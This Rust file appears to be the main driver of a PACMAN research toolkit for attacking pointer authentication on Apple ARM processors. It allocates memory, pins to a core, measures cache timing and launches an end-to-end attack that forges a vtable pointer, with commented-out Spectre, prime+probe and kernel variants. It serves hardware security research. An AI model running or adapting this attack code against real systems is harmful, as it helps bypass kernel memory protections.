#![allow(unused_imports)]
#![allow(unused_variables)]
#![allow(unused_unsafe)]
#![allow(unused_parens)]
#![allow(unused_mut)]
#![allow(non_snake_case)]
#![allow(unused_must_use)]

pub mod libdarwin;
pub mod qos;
pub mod retpoline;
pub mod tests;
pub mod counter;
pub mod evset;
pub mod pacmankit;
pub mod cache;
pub mod msr;
pub mod attacks;
pub mod pac;

// Switch this with timer_multithread.rs to use that instead
#[path="timer_msr.rs"]
pub mod timer;

use libdarwin::*;
use timer::*;
use mach::*;
use qos::*;
use retpoline::*;
use tests::*;
use counter::*;
use evset::*;
use kernel_rw::*;
use iokit::*;
use std::thread;
use core::ptr::{read_volatile, write_volatile};
use core::arch::asm;
use std::ffi::{CString, CStr};
use pacmankit::*;
use cache::*;
use std::collections::LinkedList;
use attacks::*;
use attacks::pacman::*;
use pac::*;

use rand::thread_rng;
use rand::prelude::SliceRandom;

/// How many bytes of memory should we create?
pub const MEM_REGION_SIZE : usize = 0x40000000000usize;

pub unsafe fn init_memory(memory_region: &mut [u8]) {
    let mut iter = 0;
    for i in (0..memory_region.len()).step_by(evset::STRIDE) {
        if iter >= evset::EVSET_SIZE_MAX { break; }
        core::ptr::write_volatile(&mut memory_region[i], 0x41);
        core::ptr::read_volatile(&memory_region[i]);
        iter+=1;
    }
}

/// Flush the entire L2 cache
pub unsafe fn flush_cache(memory_region: &mut [u8]) {
    for i in (0..cache::L2_SIZE).step_by(cache::L1D_LINESIZE) {
        core::ptr::write_volatile(&mut memory_region[i], 0x41);
        core::ptr::read_volatile(&memory_region[i]);
    }
}

/// Flush the L1 iCache
/// The provided address `retpoline` should be a cache::L1I_SIZE region filled with `ret`s.
pub unsafe fn flush_iCache(retpoline: u64) {
    let retpoline_unsigned = retpoline & (!PAC_BITMASK);
    for i in (0..cache::L2_SIZE).step_by(cache::L1I_LINESIZE) {
        timer::time_exec(retpoline_unsigned + i as u64);
    }
}

/**
 * Run the attacker payload.
 *
 * # Arguments
 * * `shared_mem`: A memory buffer (represented as a slice) that can be used for experiments.
 */
pub unsafe fn attack(shared_mem: &mut [u8]) {
    // Various evict+reload / prime+probe / spectre tests
    // attacks::evict_reload::inst_evict_reload(shared_mem);
    // attacks::evict_reload::data_evict_reload(shared_mem);
    // attacks::evict_reload::inst_evict_reload_kernel(shared_mem);
    // attacks::evict_reload::data_evict_reload_kernel(shared_mem);
    // attacks::prime_probe::inst_prime_probe(shared_mem);
    // attacks::spectre::inst_spectre_kernel(shared_mem);

    // PACMAN Inst/ Data
    // attacks::pacman::data_testing(shared_mem, true);
    // attacks::pacman::inst_testing(shared_mem, true);

    // Forge a vtable pointer and entry
    attacks::pacman::end_to_end(shared_mem);

    // Attack a real system call
    // attacks::pacman::pacman_real(shared_mem);
}

/**
 * Report diagnostic information about the platform.
 *
 * # Arguments
 * `shared_mem`: At least 1 page of memory that has never been read from/ written to.
 */
pub unsafe fn report_platform_info(shared_mem: &mut [u8]) {
    // It's cool to reuse the same page for measuring miss latency after doing a hit measurement,
    // just not the other way around.
    let timer_overhead = timer::timer_overhead();
    let miss_latency = timer::time_miss(shared_mem);
    let hit_latency = timer::time_hit(shared_mem);

    println!("Hit took {} cycles", hit_latency);
    println!("Miss took {} cycles", miss_latency);
    println!("Timer overhead is {} cycles", timer_overhead);
    println!("We are on core {}", core_id());
}

/**
 * Setup the execution environment and launch the attack/ traces.
 */
pub fn main() {
    unsafe {
        crandom::srand(mach_absolute_time() as u32);

        // Pin ourselves to the P core
        if !set_core(CoreKind::PCORE) {
            println!("Error setting CPU affinity!");
            return;
        }

        // Setup memory region
        let mut loc : *mut u8 = 0 as *mut u8;
        let kret = mach_vm_allocate(
            mach_task_self(),
            &mut loc,
            MEM_REGION_SIZE,
            VM_FLAGS_ANYWHERE
        );

        let err_str = CStr::from_ptr(mach_error_string(kret));

        if KERN_SUCCESS != kret {
            println!("Error creating memory region! ({}). Error is {:?}", kret, err_str);
            return;
        }

        println!("Created mach memory region at 0x{:X}", loc as u64);
        let shared_mem = core::slice::from_raw_parts_mut(
            loc as *mut u8,
            MEM_REGION_SIZE
        );

        println!("Shared memory is at 0x{:X}", &shared_mem[0] as *const u8 as usize);

        // Create counter thread and sync up with it
        thread::spawn(|| counter_thread());
        while 0 == read_volatile(&CTR) {}

        // Report platform info before shared_mem is initialized
        report_platform_info(shared_mem);
        init_memory(shared_mem);

        // Launch attacker code
        attack(shared_mem);
    }
}
